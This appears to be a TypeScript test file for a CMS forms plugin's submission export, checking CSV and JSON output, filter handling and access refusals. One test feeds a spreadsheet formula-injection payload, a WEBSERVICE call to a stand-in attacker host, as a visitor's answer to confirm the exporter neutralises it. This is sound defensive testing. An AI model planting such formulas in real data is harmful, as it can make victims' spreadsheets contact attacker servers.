import { text } from "plumix/fields";
import { createTestContext } from "plumix/test";
import { describe, expect, test } from "vitest";

import type { FormsHarness } from "../test/harness.js";
import type { SubmissionDTO } from "../types.js";
import { defineForm } from "../define-form.js";
import { forms } from "../index.js";
import { createFormsTestDb } from "../test/db.js";
import { submissionFactory } from "../test/factories.js";
import { createFormsHarness } from "../test/harness.js";
import {
  createExportHandler,
  submissionsToCsv,
  submissionsToJson,
} from "./export.js";

const contact = defineForm("contact", {
  fields: [text("name").label("Your name")],
});

async function seeded(): Promise<FormsHarness> {
  const harness = await createFormsHarness([forms({ forms: [contact] })]);
  const seed = submissionFactory.transient({ db: harness.db });
  await seed.create({
    formSlug: "contact",
    serial: 1,
    answers: { name: "Ada" },
  });
  await seed.create({
    formSlug: "contact",
    serial: 2,
    status: "spam",
    answers: { name: "Mallory" },
  });
  return harness;
}

function submission(overrides: Partial<SubmissionDTO> = {}): SubmissionDTO {
  return {
    id: 1,
    form: "contact",
    serial: 7,
    status: "new",
    answers: { name: "Ada" },
    labels: { name: { label: "Your name" } },
    entryId: null,
    ipHash: null,
    userAgent: null,
    handlerError: null,
    note: null,
    createdAt: "2026-01-02T03:04:05.000Z",
    ...overrides,
  };
}

describe("submissionsToCsv", () => {
  test("heads the answers with the envelope and writes a line per submission", () => {
    const lines = submissionsToCsv([submission()]).split("\r\n");

    expect(lines[0]).toBe("\uFEFFReceived,Form,Number,Status,Your name,Note");
    expect(lines[1]).toBe("2026-01-02T03:04:05.000Z,contact,7,new,Ada,");
  });

  // The acceptance criterion is about the exported file, not about
  // `toCsv` in isolation: this fails if the neutralising is ever lifted
  // out of the path an export actually takes.
  test("neutralises a formula a visitor typed into an answer", () => {
    const lines = submissionsToCsv([
      submission({ answers: { name: `=WEBSERVICE("https://evil.test")` } }),
    ]).split("\r\n");

    expect(lines[1]).toContain(`"'=WEBSERVICE(""https://evil.test"")"`);
  });

  test("exports a submission whose form is gone under its original labels", () => {
    const lines = submissionsToCsv([
      submission(),
      submission({
        id: 2,
        form: "retired",
        serial: 1,
        answers: { budget: "-40" },
        labels: { budget: { label: "What we used to ask" } },
      }),
    ]).split("\r\n");

    expect(lines[0]).toBe(
      "\uFEFFReceived,Form,Number,Status,Your name,What we used to ask,Note",
    );
    expect(lines[2]).toBe("2026-01-02T03:04:05.000Z,retired,1,new,,-40,");
  });
});

describe("submissionsToJson", () => {
  test("hands back the whole row, envelope and all", () => {
    const row = submission({ ipHash: "deadbeef", userAgent: "curl/8" });

    expect(JSON.parse(submissionsToJson([row]))).toEqual([row]);
  });
});

describe("the export route", () => {
  test("exports the submissions the active filters name", async () => {
    const harness = await seeded();
    const editor = await harness.seedUser("editor");

    const response = await harness.fetch("/_plumix/forms/export?status=spam", {
      as: editor,
    });

    response.assertStatus(200);
    const body = await response.text();
    expect(body).toContain("Mallory");
    expect(body).not.toContain("Ada");
  });

  test("answers JSON when asked, named for the filters it was taken under", async () => {
    const harness = await seeded();
    const editor = await harness.seedUser("editor");

    const response = await harness.fetch(
      "/_plumix/forms/export?format=json&form=contact&status=spam",
      { as: editor },
    );

    response.assertStatus(200);
    expect(response.headers.get("content-disposition")).toBe(
      'attachment; filename="submissions-contact-spam.json"',
    );
    const rows = JSON.parse(await response.text()) as SubmissionDTO[];
    expect(rows.map((row) => row.answers)).toEqual([{ name: "Mallory" }]);
  });

  test("refuses a signed-in reader who cannot moderate submissions", async () => {
    const harness = await seeded();
    const subscriber = await harness.seedUser("subscriber");

    const response = await harness.fetch("/_plumix/forms/export", {
      as: subscriber,
    });

    response.assertStatus(403);
    expect(await response.text()).not.toContain("Ada");
  });

  test("refuses a caller with no session at all", async () => {
    const harness = await seeded();

    const response = await harness.fetch("/_plumix/forms/export");

    response.assertStatus(401);
    expect(await response.text()).not.toContain("Ada");
  });

  test("refuses a format it cannot write rather than exporting everything", async () => {
    const harness = await seeded();
    const editor = await harness.seedUser("editor");

    const response = await harness.fetch("/_plumix/forms/export?format=xlsx", {
      as: editor,
    });

    response.assertStatus(400);
    expect(await response.text()).not.toContain("Ada");
  });

  test("reads an empty filter as no filter rather than as an empty slug", async () => {
    const harness = await seeded();
    const editor = await harness.seedUser("editor");

    const response = await harness.fetch(
      "/_plumix/forms/export?form=&status=",
      { as: editor },
    );

    response.assertStatus(200);
    expect(await response.text()).toContain("Ada");
  });

  // The columns come from the rows, so nothing can be written until the
  // last one is read: an export is held whole in memory by construction,
  // and a Worker isolate has a ceiling. Better to say so than to hand
  // back a file that looks complete.
  test("refuses an export past the ceiling rather than truncating it", async () => {
    const db = await createFormsTestDb();
    const seed = submissionFactory.transient({ db });
    await seed.create({ formSlug: "contact", serial: 1 });
    await seed.create({ formSlug: "contact", serial: 2 });

    const response = await createExportHandler(1)(
      new Request("https://cms.example/_plumix/forms/export"),
      createTestContext({ db }),
    );

    expect(response.status).toBe(413);
    expect(await response.text()).not.toContain("Visitor");
  });
});
